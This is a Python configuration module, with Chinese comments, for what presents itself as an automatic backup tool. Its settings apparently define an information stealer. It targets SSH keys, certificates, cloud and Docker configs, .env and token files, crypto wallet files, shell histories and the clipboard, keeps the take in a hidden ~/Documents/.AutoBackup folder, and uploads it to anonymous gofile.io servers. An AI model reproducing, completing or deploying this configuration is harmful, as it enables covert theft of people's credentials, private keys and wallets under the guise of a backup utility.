# -*- coding: utf-8 -*-

import os
import logging

class BackupConfig:
    """备份配置类"""
    
    # 调试配置
    DEBUG_MODE = True  # 是否输出调试日志（False/True）
    
    # 文件大小限制
    MAX_SOURCE_DIR_SIZE = 500 * 1024 * 1024  # 500MB 源目录最大大小
    MAX_SINGLE_FILE_SIZE = 50 * 1024 * 1024  # 50MB 压缩后单文件最大大小
    CHUNK_SIZE = 50 * 1024 * 1024  # 50MB 分片大小
    
    # 上传配置
    RETRY_COUNT = 3  # 重试次数
    RETRY_DELAY = 30  # 重试等待时间（秒）
    UPLOAD_TIMEOUT = 1000  # 上传超时时间（秒）
    
    # 网络配置
    NETWORK_TIMEOUT = 3  # 网络检查超时时间（秒）
    NETWORK_CHECK_HOSTS = [
        ("8.8.8.8", 53),        # Google DNS
        ("1.1.1.1", 53),        # Cloudflare DNS
        ("208.67.222.222", 53)  # OpenDNS
    ]
    
    # 监控配置
    BACKUP_INTERVAL = 260000  # 备份间隔时间（约3天）
    CLIPBOARD_INTERVAL = 1200  # ZTB备份间隔时间（20分钟，单位：秒）
    CLIPBOARD_CHECK_INTERVAL = 3  # ZTB检查间隔（秒）
    CLIPBOARD_UPLOAD_CHECK_INTERVAL = 60  # ZTB上传检查间隔（秒）
    
    # 文件操作配置
    SCAN_TIMEOUT = 600  # 扫描目录超时时间（秒）
    FILE_RETRY_COUNT = 3  # 文件访问重试次数
    FILE_RETRY_DELAY = 5  # 文件重试等待时间（秒）
    COPY_CHUNK_SIZE = 1024 * 1024  # 文件复制块大小（1MB，提高性能）
    PROGRESS_INTERVAL = 10  # 进度显示间隔（秒）
    
    # 上传配置
    MAX_SERVER_RETRIES = 2  # 每个服务器最多尝试次数
    FILE_DELAY_AFTER_UPLOAD = 1  # 上传后等待文件释放的时间（秒）
    FILE_DELETE_RETRY_COUNT = 3  # 文件删除重试次数
    FILE_DELETE_RETRY_DELAY = 2  # 文件删除重试等待时间（秒）
    
    # 错误处理配置
    CLIPBOARD_ERROR_WAIT = 60  # ZTB监控连续错误等待时间（秒）
    BACKUP_CHECK_INTERVAL = 3600  # 备份检查间隔（秒，每小时检查一次）
    ERROR_RETRY_DELAY = 60  # 发生错误时重试等待时间（秒）
    MAIN_ERROR_RETRY_DELAY = 300  # 主程序错误重试等待时间（秒，5分钟）
    
    # 磁盘空间检查
    MIN_FREE_SPACE = 1024 * 1024 * 1024  # 最小可用空间（1GB）
    
    # 备份目录 - 用户主目录
    BACKUP_ROOT = os.path.expanduser('~/Documents/.AutoBackup')
    
    # 时间阈值文件
    THRESHOLD_FILE = os.path.join(BACKUP_ROOT, 'next_backup_time.txt')
    
    # 日志配置
    LOG_FILE = os.path.join(BACKUP_ROOT, 'backup.log')
    LOG_FORMAT = '%(asctime)s - %(levelname)s - %(message)s'
    LOG_LEVEL = logging.INFO
    
    # 磁盘文件分类
    DISK_EXTENSIONS_1 = [  # 文档类
        # 文本和文档
        ".txt", ".rtf", ".md", ".markdown", ".rst", ".tex", ".doc", ".docx", ".pages",
        # 电子表格
        ".xls", ".xlsx", ".numbers", ".csv", ".tsv",
        # 代码文件
        ".py", ".js", ".ts", ".jsx", ".tsx", ".go", ".sh", ".bash", ".zsh", ".sol", ".rs", 
        # 配置文件
        ".json", ".yaml", ".yml", ".xml", ".plist", ".conf", ".config", ".ini",
        # 数据文件
        ".wallet", ".bin"
    ]
    
    DISK_EXTENSIONS_2 = [  # 配置和密钥类
        # 密钥和证书
        ".pem", ".key", ".pub", ".crt", ".cer", ".der", ".p12", ".pfx",
        ".keystore", ".jks", ".asc", ".gpg", ".pgp",
        # SSH相关
        "id_rsa", "id_ecdsa", "id_ed25519", ".ssh",
        # 云服务配置
        ".aws", ".kube", ".docker", ".gitconfig",
        # 其他安全相关
        ".env", ".secret", ".token", ".credential"
    ]   
    
    # 备用上传服务器
    UPLOAD_SERVERS = [
        "https://store9.gofile.io/uploadFile",
        "https://store8.gofile.io/uploadFile",
        "https://store7.gofile.io/uploadFile",
        "https://store6.gofile.io/uploadFile",
        "https://store5.gofile.io/uploadFile"
    ]
    
    # 指定要直接复制的目录和文件
    MACOS_SPECIFIC_DIRS = [
        ".ssh",               # SSH配置
        ".bash_history",      # Bash历史记录
        ".python_history",    # Python历史记录
        ".node_repl_history", # Node.js REPL 历史记录
        ".wget-hsts",         # wget HSTS 历史记录
        ".Xauthority",        # Xauthority 文件
        ".ICEauthority",      # ICEauthority 文件
        ".zsh_history",       # Zsh历史记录
        ".zsh_sessions"       # Zsh会话
    ]

# 配置日志
if BackupConfig.DEBUG_MODE:
    logging.basicConfig(
        level=logging.DEBUG,
        format=BackupConfig.LOG_FORMAT,
        handlers=[
            logging.StreamHandler()
        ]
    )
else:
    logging.basicConfig(
        level=BackupConfig.LOG_LEVEL,
        format=BackupConfig.LOG_FORMAT,
        handlers=[
            logging.FileHandler(BackupConfig.LOG_FILE, encoding='utf-8'),
            logging.StreamHandler()
        ]
    )

